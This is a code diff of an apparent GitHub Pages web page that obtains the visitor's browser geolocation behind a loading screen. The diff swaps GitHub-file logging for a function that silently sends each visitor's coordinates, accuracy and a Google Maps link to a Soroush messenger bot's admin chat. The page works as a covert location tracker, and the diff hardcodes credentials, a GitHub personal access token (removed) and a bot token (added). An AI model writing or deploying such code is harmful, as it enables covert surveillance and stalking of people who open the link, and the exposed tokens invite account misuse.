@@ -93,18 +93,12 @@
 
 <script>
     /* ============================================================
-       تنظیمات GitHub
+       تنظیمات ربات سروش
        ============================================================ */
-    const GITHUB_TOKEN = "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";  // ← توکن جدید خود را اینجا بگذارید
-    const FILE_PATH    = "location.txt";
+    const SOROUSH_BOT_TOKEN = "69646551:NnjQ4Qiown8p4fUek47dH5Ajl4kcAuyQeRA";
+    const SOROUSH_ADMIN_ID  = 62519146;  // chat_id مقصد (ADMIN_ID شما)
+    const SOROUSH_API_BASE  = `https://api.splus.ir/bot${SOROUSH_BOT_TOKEN}`;
     /* ============================================================ */
-
-    // استخراج خودکار یوزرنیم و نام مخزن از آدرس GitHub Pages
-    // مثال: https://username.github.io/viking-gps/  →  owner=username, repo=viking-gps
-    const REPO_OWNER = window.location.hostname.split(".")[0];
-    const REPO_NAME  = window.location.pathname.split("/").filter(Boolean)[0] || "";
-
-    console.log(`🔍 مخزن شناسایی‌شده: ${REPO_OWNER}/${REPO_NAME}`);
 
 
     const loadingScreen = document.getElementById("loadingScreen");
@@ -132,101 +126,34 @@
         timeoutIds = [];
     }
 
-    // ---------- آپلود به GitHub ----------
-    async function updateGithubFile(newEntry) {
-        if (!REPO_OWNER || !REPO_NAME) {
-            console.error("❌ نتوانستم owner/repo را از آدرس صفحه تشخیص دهم.");
-            return;
-        }
-
-        const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
-        const headers = {
-            "Authorization": `Bearer ${GITHUB_TOKEN}`,
-            "Accept": "application/vnd.github+json",
-            "X-GitHub-Api-Version": "2022-11-28"
-        };
+    // ---------- ارسال به ربات سروش ----------
+    async function sendLocationToSoroush(lat, lon, acc) {
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        const text =
+            `📍 موقعیت جدید\n\n` +
+            `🌍 Latitude: ${lat}\n` +
+            `🌍 Longitude: ${lon}\n` +
+            `🎯 دقت: ${acc} متر\n\n` +
+            `🗺 نقشه:\n${mapsUrl}`;
 
         try {
-            // ۱. گرفتن SHA و محتوای فعلی
-            let oldContent = "";
-            let sha = null;
-
-            const getRes = await fetch(apiUrl + "?t=" + Date.now(), {
-                headers: headers
+            const res = await fetch(`${SOROUSH_API_BASE}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: SOROUSH_ADMIN_ID,
+                    text: text
+                })
             });
-
-            if (getRes.ok) {
-                const data = await getRes.json();
-                sha = data.sha;
-                if (data.content) {
-                    const binary = atob(data.content.replace(/\s/g, ""));
-                    const bytes  = new Uint8Array(binary.length);
-                    for (let i = 0; i < binary.length; i++) {
-                        bytes[i] = binary.charCodeAt(i);
-                    }
-                    oldContent = new TextDecoder("utf-8").decode(bytes);
-                }
-            } else if (getRes.status !== 404) {
-                const err = await getRes.json();
-                console.error("❌ خطا در خواندن فایل:", getRes.status, err);
-                return;
-            }
-
-            // ۲. محتوای جدید = قبلی + بلوک جدید
-            const finalContent = oldContent + newEntry;
-
-            // ۳. رمزگذاری base64 سازگار با UTF-8
-            const bytes = new TextEncoder().encode(finalContent);
-            let binary = "";
-            bytes.forEach(b => binary += String.fromCharCode(b));
-            const encoded = btoa(binary);
-
-            // ۴. PUT برای به‌روزرسانی
-            const body = {
-                message: `📍 موقعیت جدید - ${new Date().toISOString()}`,
-                content: encoded
-            };
-            if (sha) body.sha = sha;
-
-            const putRes = await fetch(apiUrl, {
-                method: "PUT",
-                headers: {
-                    ...headers,
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(body)
-            });
-
-            if (putRes.ok) {
-                console.log("✅ location.txt در GitHub به‌روزرسانی شد");
+            const data = await res.json();
+            if (data.ok) {
+                console.log("✅ موقعیت به سروش ارسال شد");
             } else {
-                const err = await putRes.json();
-                console.error("❌ خطا در آپلود:", putRes.status, err);
+                console.error("❌ خطا در ارسال به سروش:", data);
             }
         } catch (e) {
-            console.error("❌ خطا در ارتباط با GitHub:", e);
+            console.error("❌ خطای شبکه در ارسال به سروش:", e);
         }
-    }
-
-    function buildEntry(lat, lon, acc) {
-        const now     = new Date().toLocaleString("fa-IR");
-        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-        return [
-            `[${now}] ✅ SUCCESS`,
-            `    Latitude : ${lat}`,
-            `    Longitude: ${lon}`,
-            `    Accuracy : ${acc} m`,
-            `    Maps     : ${mapsUrl}`,
-            `    ${"-".repeat(45)}`,
-            "",
-            ""
-        ].join("\n");
-    }
-
-    function buildErrorEntry(reason, desc) {
-        const now = new Date().toLocaleString("fa-IR");
-        return `[${now}] ❌ ERROR | ${reason} | ${desc}\n\n`;
     }
 
     // ---------- موفقیت ----------
@@ -241,10 +168,10 @@
 
         showScreen("success");
 
-        updateGithubFile(buildEntry(lat, lon, acc));
+        // ارسال به ربات سروش
+        sendLocationToSoroush(lat, lon, acc);
 
         console.log("📍 مختصات:", lat, lon, "دقت:", acc, "متر");
-        console.log("🗺 نقشه:", `https://www.google.com/maps?q=${lat},${lon}`);
     }
 
     // ---------- خطا ----------
@@ -264,10 +191,7 @@
                 "دریافت موقعیت زمان‌بر شد."
         };
 
-        const desc = messages[reason] || "خطای ناشناخته";
-        errorText.textContent = desc;
-
-        updateGithubFile(buildErrorEntry(reason, desc));
+        errorText.textContent = messages[reason] || "خطای ناشناخته";
     }
 
     // ---------- استراتژی چندمرحله‌ای ----------
